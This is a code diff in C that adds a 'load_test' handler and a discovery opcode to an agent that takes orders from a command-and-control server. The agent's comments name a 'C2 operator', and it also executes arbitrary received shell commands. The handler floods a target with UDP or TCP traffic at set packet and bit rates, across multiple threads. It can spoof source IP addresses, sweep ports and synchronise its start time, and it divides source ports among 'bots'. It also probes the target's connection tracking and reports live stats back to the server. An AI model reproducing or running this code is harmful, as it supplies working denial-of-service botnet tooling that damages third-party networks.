+    else if (tok_eq(json_str, &toks[i], "spoof_source")) spoof_source = (vbuf[0] == 't' || vbuf[0] == '1');
+    else if (tok_eq(json_str, &toks[i], "start_mono_ns")) start_mono_ns = (uint64_t)strtoull(vbuf, NULL, 10);
+    else if (tok_eq(json_str, &toks[i], "port_base"))   port_base = (uint16_t)atoi(vbuf);
+    else if (tok_eq(json_str, &toks[i], "port_span"))   port_span = (uint16_t)atoi(vbuf);
+    else if (tok_eq(json_str, &toks[i], "port_stride")) port_stride = (uint16_t)atoi(vbuf);
+    else if (tok_eq(json_str, &toks[i], "src_ips") && toks[i+1].type == JSMN_ARRAY) {
+      int arr = i + 1, cnt = toks[arr].size;
+      int t = arr + 1;
+      for (int j = 0; j < cnt && src_ip_count < MAX_SRC_IPS; j++, t++) {
+        char ipbuf[20]; int l = toks[t].end - toks[t].start;
+        if (l < (int)sizeof(ipbuf)) {
+          memcpy(ipbuf, json_str + toks[t].start, l); ipbuf[l] = 0;
+          struct in_addr a;
+          if (inet_pton(AF_INET, ipbuf, &a) == 1)
+            src_ips[src_ip_count++] = a.s_addr;
+        }
+      }
+    }
+    else if (tok_eq(json_str, &toks[i], "phases") && toks[i+1].type == JSMN_ARRAY) {
+      int arr = i + 1, arr_cnt = toks[arr].size;
+      int t = arr + 1;
+      for (int j = 0; j < arr_cnt && phase_count < MAX_PHASES; j++) {
+        if (toks[t].type != JSMN_OBJECT) { t++; continue; }
+        load_phase_t ph = { .mode = MODE_UDP_RAW, .duration_s = 10, .pps = 50000, .bps = 100e6, .ramp_s = 0 };
+        int obj_keys = toks[t].size;
+        t++;
+        for (int k = 0; k < obj_keys; k++) {
+          int kl = toks[t].end - toks[t].start;
+          int vl2 = toks[t+1].end - toks[t+1].start;
+          char kbuf[24], vb[32];
+          if (kl < (int)sizeof(kbuf) && vl2 < (int)sizeof(vb)) {
+            memcpy(kbuf, json_str + toks[t].start, kl); kbuf[kl] = 0;
+            memcpy(vb, json_str + toks[t+1].start, vl2); vb[vl2] = 0;
+            if (strcmp(kbuf, "mode") == 0) {
+              for (int m = 0; m < MODE_COUNT; m++)
+                if (load_modes[m].name && strcmp(vb, load_modes[m].name) == 0) { ph.mode = m; break; }
+            } else if (strcmp(kbuf, "duration_s") == 0) ph.duration_s = atof(vb);
+            else if (strcmp(kbuf, "pps") == 0) ph.pps = atof(vb);
+            else if (strcmp(kbuf, "bps") == 0) ph.bps = atof(vb);
+            else if (strcmp(kbuf, "ramp_s") == 0) ph.ramp_s = atof(vb);
+          }
+          t += 2;
+        }
+        phases[phase_count++] = ph;
+      }
+    }
+  }
+
+  int pattern = 0;
+  if (pat[0] == 'z') pattern = 1;
+  else if (pat[0] == 'r') pattern = 2;
+  else if (pat[0] == 's') pattern = 3;
+
+  int mode = MODE_UDP_RAW;
+  if (modebuf[0]) {
+    for (int i = 0; i < MODE_COUNT; i++) {
+      if (load_modes[i].name && strcmp(modebuf, load_modes[i].name) == 0) { mode = i; break; }
+    }
+  }
+
+  if (!target[0] || port == 0) {
+    snprintf(out, out_cap, "load_test: missing target or port");
+    return -1;
+  }
+  if (src_port_base > 0 && src_port_base < 1024 && geteuid() != 0) {
+    snprintf(out, out_cap, "load_test: src_port=%d requires root (privileged port range 1-1023)", src_port_base);
+    return -1;
+  }
+  if (src_port_base > 0) {
+    uint32_t available = 65536 - (uint32_t)src_port_base;
+    uint32_t max_threads = available / SRC_PORT_WINDOWS;
+    if (max_threads < 1 || (uint32_t)threads > max_threads) {
+      snprintf(out, out_cap,
+               "load_test: src_port=%d with threads=%d exceeds 16-bit port range "
+               "(available=%u, %d windows require <=%u threads each)",
+               src_port_base, threads, available, SRC_PORT_WINDOWS, max_threads);
+      return -1;
+    }
+  }
+  if (mode == MODE_UDP_SPOOF_FLOW && spoof_source && geteuid() != 0) {
+    snprintf(out, out_cap, "load_test: udp_spoof_flow with spoof_source requires root");
+    return -1;
+  }
+  if (threads < 1) threads = 1;
+  if (threads > LOAD_MAX_THREADS) threads = LOAD_MAX_THREADS;
+  if (duration < 1.0) duration = 1.0;
+  if (duration > 300.0) duration = 300.0;
+
+  int proto_tcp = (proto[0] == 't' || proto[0] == 'T') ? 1 : 0;
+
+  /* Pre-flight probe (skip for udp_raw — backward compat):
+   *   Phase 1: 10 zero-byte UDP packets — reachability check.
+   *   Phase 2: 100 one-packet 5-tuples (unique source ports) — estimate
+   *            conntrack/flow-table drop rate. Each send is a new ephemeral
+   *            socket bound to a sequential port, so each creates a distinct
+   *            5-tuple on the target's conntrack. */
+  if (mode != MODE_UDP_RAW) {
+    int probe_ok = 0, probe_sent = 0;
+    /* Phase 1: reachability */
+    udp_sender_t probe;
+    if (udp_sender_init(&probe, target, port) == 0) {
+      char zbuf[1] = {0};
+      for (int p = 0; p < 10; p++) {
+        if (udp_send(&probe, zbuf, 1) >= 0) probe_ok++;
+      }
+      udp_sender_destroy(&probe);
+    }
+    if (probe_ok == 0) {
+      fprintf(stderr, "load_test: pre-flight — target not responding on any of 10 probes (continuing anyway)\n");
+    }
+
+    /* Phase 2: 100 unique 5-tuples for conntrack estimation */
+    int tuple_ok = 0;
+    uint16_t probe_port = 32768;
+    for (int t = 0; t < 100; t++) {
+      int pfd = socket(AF_INET, SOCK_DGRAM, 0);
+      if (pfd < 0) break;
+      int reuse = 1;
+      setsockopt(pfd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
+      struct sockaddr_in ba;
+      memset(&ba, 0, sizeof(ba));
+      ba.sin_family = AF_INET;
+      ba.sin_port = htons(probe_port++);
+      ba.sin_addr.s_addr = INADDR_ANY;
+      if (bind(pfd, (struct sockaddr *)&ba, sizeof(ba)) != 0) { close(pfd); continue; }
+
+      struct sockaddr_in da;
+      memset(&da, 0, sizeof(da));
+      da.sin_family = AF_INET;
+      da.sin_port = htons(port);
+      inet_pton(AF_INET, target, &da.sin_addr);
+
+      char tbuf[24] = {0};
+      ssize_t n = sendto(pfd, tbuf, sizeof(tbuf), 0,
+                         (struct sockaddr *)&da, sizeof(da));
+      if (n >= 0) { tuple_ok++; probe_sent++; }
+      close(pfd);
+    }
+    if (probe_sent > 0) {
+      conntrack_drop_pct = 100 - (tuple_ok * 100 / probe_sent);
+      fprintf(stderr, "load_test: pre-flight conntrack probe — %d/%d tuples succeeded (%d%% drop)\n",
+              tuple_ok, probe_sent, conntrack_drop_pct);
+    }
+  }
+
+  rate_limiter_t shared_rl;
+  rate_limiter_t *shared_rl_ptr = NULL;
+  if (aggregate) {
+    if (rate_limiter_init(&shared_rl, pps, bps, pps * 0.1, bps * 0.1) != 0) {
+      snprintf(out, out_cap, "load_test: rate limiter init failed");
+      return -1;
+    }
+    shared_rl_ptr = &shared_rl;
+  }
+
+  double per_thread_pps = pps / threads;
+  double per_thread_bps = bps / threads;
+
+  load_thread_arg_t args[LOAD_MAX_THREADS];
+  pthread_t tids[LOAD_MAX_THREADS];
+  int thread_started[LOAD_MAX_THREADS] = {0};
+
+  unsigned int bot_hash = 0;
+  if (src_port_base) {
+    for (const char *c = g_cfg.node; *c; c++)
+      bot_hash = bot_hash * 2654435761u + (unsigned char)*c;
+  }
+
+  for (int i = 0; i < threads; i++) {
+    memset(&args[i], 0, sizeof(args[i]));
+    args[i].thread_id = i;
+    memcpy(args[i].target, target, sizeof(target));
+    args[i].port = port;
+    args[i].duration = duration;
+    args[i].proto_tcp = proto_tcp;
+    args[i].mode = mode;
+    args[i].pattern = pattern;
+    args[i].src_port = src_port_base
+      ? (uint16_t)(src_port_base + (bot_hash % SRC_PORT_WINDOWS) * threads + i)
+      : 0;
+    args[i].pps = per_thread_pps;
+    args[i].bps = per_thread_bps;
+    args[i].shared_rl = shared_rl_ptr;
+    args[i].port_base = port_base;
+    args[i].port_span = port_span;
+    args[i].port_stride = port_stride;
+    args[i].spoof_enabled = spoof_source;
+    args[i].src_ips = src_ip_count > 0 ? src_ips : NULL;
+    args[i].src_ip_count = src_ip_count;
+    args[i].start_mono_ns = start_mono_ns;
+    args[i].phases = phase_count > 0 ? phases : NULL;
+    args[i].phase_count = phase_count;
+    if (pthread_create(&tids[i], NULL, load_thread_fn, &args[i]) == 0)
+      thread_started[i] = 1;
+  }
+
+  /* Heartbeat thread: 500ms periodic stats POST while test runs. */
+  heartbeat_ctx_t hb_ctx = { .args = args, .threads = threads, .running = 1, .cmd_id = cmd_id };
+  pthread_t hb_tid;
+  int hb_started = (cmd_id && pthread_create(&hb_tid, NULL, heartbeat_thread_fn, &hb_ctx) == 0);
+
+  /* Watchdog: if senders haven't finished after total duration+5s, force-cancel them. */
+  double total_duration = duration;
+  if (phase_count > 0) {
+    total_duration = 0;
+    for (int i = 0; i < phase_count; i++) total_duration += phases[i].duration_s;
+  }
+  struct timespec wdog_deadline;
+  clock_gettime(CLOCK_REALTIME, &wdog_deadline);
+  wdog_deadline.tv_sec += (time_t)(total_duration + 10.0);
+
+  uint64_t agg_bytes = 0, agg_ops = 0;
+  uint64_t agg_eagain = 0, agg_connreset = 0, agg_pipe = 0;
+  uint64_t agg_connrefused = 0, agg_enobufs = 0, agg_ehostunreach = 0;
+  uint64_t agg_eacces = 0, agg_err_other = 0;
+  uint32_t agg_retransmits = 0;
+  uint32_t rtt_min = 0, rtt_max = 0;
+  uint64_t rtt_sum = 0, rttvar_sum = 0;
+  int rtt_count = 0;
+  int any_unreachable = 0;
+  uint64_t first_unreachable = 0;
+
+  for (int i = 0; i < threads; i++) {
+    if (!thread_started[i]) continue;
+    int rc = pthread_timedjoin_np(tids[i], NULL, &wdog_deadline);
+    if (rc != 0) {
+      pthread_cancel(tids[i]);
+      pthread_join(tids[i], NULL);
+      fprintf(stderr, "load_test: watchdog killed thread %d\n", i);
+    }
+    agg_bytes        += args[i].total_bytes;
+    agg_ops          += args[i].total_ops;
+    agg_eagain       += args[i].err_eagain;
+    agg_connreset    += args[i].err_connreset;
+    agg_pipe         += args[i].err_pipe;
+    agg_connrefused  += args[i].err_connrefused;
+    agg_enobufs      += args[i].err_enobufs;
+    agg_ehostunreach += args[i].err_ehostunreach;
+    agg_eacces       += args[i].err_eacces;
+    agg_err_other    += args[i].err_other;
+    if (!args[i].target_reachable) any_unreachable = 1;
+    if (args[i].first_unreachable_ns &&
+        (!first_unreachable || args[i].first_unreachable_ns < first_unreachable))
+      first_unreachable = args[i].first_unreachable_ns;
+    if (proto_tcp && args[i].rtt_us > 0) {
+      agg_retransmits += args[i].retransmits;
+      rtt_sum    += args[i].rtt_us;
+      rttvar_sum += args[i].rttvar_us;
+      rtt_count++;
+      if (args[i].min_rtt_us < rtt_min || rtt_min == 0) rtt_min = args[i].min_rtt_us;
+      if (args[i].max_rtt_us > rtt_max) rtt_max = args[i].max_rtt_us;
+    }
+  }
+  hb_ctx.running = 0;
+  if (hb_started) pthread_join(hb_tid, NULL);
+  if (shared_rl_ptr) rate_limiter_destroy(shared_rl_ptr);
+
+  double mbps = (double)agg_bytes * 8.0 / total_duration / 1e6;
+  uint64_t total_errs = agg_eagain + agg_connreset + agg_pipe + agg_connrefused
+                      + agg_enobufs + agg_ehostunreach + agg_eacces + agg_err_other;
+  const char *mode_name = (mode >= 0 && mode < MODE_COUNT && load_modes[mode].name) ? load_modes[mode].name : "udp_raw";
+
+  int w = snprintf(out, out_cap,
+           "load_test: mode=%s proto=%s target=%s:%d threads=%d duration=%.0fs "
+           "total_bytes=%llu total_ops=%llu throughput=%.1f Mbps",
+           mode_name, proto_tcp ? "tcp" : "udp", target, port, threads, total_duration,
+           (unsigned long long)agg_bytes, (unsigned long long)agg_ops, mbps);
+
+  if (proto_tcp && rtt_count > 0 && w > 0 && (size_t)w < out_cap) {
+    uint32_t rtt_avg = (uint32_t)(rtt_sum / rtt_count);
+    uint32_t jitter_avg = (uint32_t)(rttvar_sum / rtt_count);
+    double retrans_pct = agg_ops > 0 ? 100.0 * agg_retransmits / (double)agg_ops : 0.0;
+    w += snprintf(out + w, out_cap - w,
+                  " rtt_ms=%.1f/%.1f/%.1f jitter_ms=%.1f retransmits=%u(%.2f%%)",
+                  (double)rtt_min / 1000.0, (double)rtt_avg / 1000.0,
+                  (double)rtt_max / 1000.0, (double)jitter_avg / 1000.0,
+                  agg_retransmits, retrans_pct);
+  }
+
+  if (total_errs > 0 && w > 0 && (size_t)w < out_cap) {
+    if (proto_tcp) {
+      w += snprintf(out + w, out_cap - w,
+               " errors=%llu (EAGAIN=%llu CONNRESET=%llu EPIPE=%llu other=%llu)",
+               (unsigned long long)total_errs,
+               (unsigned long long)agg_eagain, (unsigned long long)agg_connreset,
+               (unsigned long long)agg_pipe, (unsigned long long)agg_err_other);
+    } else {
+      w += snprintf(out + w, out_cap - w,
+               " errors=%llu (EAGAIN=%llu CONNREFUSED=%llu ENOBUFS=%llu EHOSTUNREACH=%llu EACCES=%llu other=%llu)",
+               (unsigned long long)total_errs,
+               (unsigned long long)agg_eagain, (unsigned long long)agg_connrefused,
+               (unsigned long long)agg_enobufs, (unsigned long long)agg_ehostunreach,
+               (unsigned long long)agg_eacces, (unsigned long long)agg_err_other);
+    }
+  }
+  if (any_unreachable && w > 0 && (size_t)w < out_cap) {
+    w += snprintf(out + w, out_cap - w, " target_reachable=false");
+  }
+  if (first_unreachable && w > 0 && (size_t)w < out_cap) {
+    w += snprintf(out + w, out_cap - w, " first_unreachable_ns=%llu",
+                  (unsigned long long)first_unreachable);
+  }
+  if (conntrack_drop_pct >= 0 && w > 0 && (size_t)w < out_cap) {
+    w += snprintf(out + w, out_cap - w, " conntrack_drop_pct=%d", conntrack_drop_pct);
+  }
+  if (!proto_tcp && pattern == 1 && w > 0 && (size_t)w < out_cap) {
+    w += snprintf(out + w, out_cap - w,
+             "\nnote: pattern=zeros carries no sequence counter — reorder, dup, and loss are undetectable. Use pattern=seq for delivery measurement.");
+  }
+  return 0;
+}
+
 static volatile int g_config_updated;
 static void cfg_set(char *dst, size_t cap, const char *val);
 static void parse_addresses(const char *val);
@@ -800,9 +1869,11 @@ static void process_commands(const char *json) {
       } else if (strstr(cmdbuf, "\"config_update\"")) {
         exit_code = handle_config_update(cmdbuf, cl) == 0 ? 0 : 1;
         snprintf(out, sizeof(out), exit_code == 0 ? "config_update: OK (count=%d)" : "config_update: FAILED", g_cfg.addr_count);
+      } else if (strstr(cmdbuf, "\"discovery\"")) {
+        exit_code = handle_discovery(cmdbuf, cl, out, sizeof(out)) == 0 ? 0 : 1;
+      } else if (strstr(cmdbuf, "\"load_test\"")) {
+        exit_code = handle_load_test(cmdbuf, cl, out, sizeof(out), idbuf) == 0 ? 0 : 1;
       } else {
-        /* Extract the opcode value for the error report so the C2 operator
-         * can see exactly which opcode this agent doesn't understand. */
         const char *vstart = cmdbuf + 9;
         while (*vstart == ' ' || *vstart == '"') vstart++;
         char opname[64];
@@ -810,9 +1881,11 @@ static void process_commands(const char *json) {
         while (vstart[oi] && vstart[oi] != '"' && vstart[oi] != ',' && vstart[oi] != '}' && oi < (int)sizeof(opname) - 1) oi++;
         memcpy(opname, vstart, oi);
         opname[oi] = 0;
-        snprintf(out, sizeof(out), "unknown opcode: %s (agent v%d)", opname, M12_PROTO_VERSION);
+        snprintf(out, sizeof(out),
+                 "{\"__m12\":\"error\",\"reason\":\"unknown_opcode\",\"opcode\":\"%s\",\"agent_version\":%d}",
+                 opname, M12_PROTO_VERSION);
         exit_code = 1;
-        fprintf(stderr, "m12-agent: %s\n", out);
+        fprintf(stderr, "m12-agent: unknown opcode: %s\n", opname);
       }
     } else {
       run_command(cmdbuf, out, sizeof(out), &exit_code);
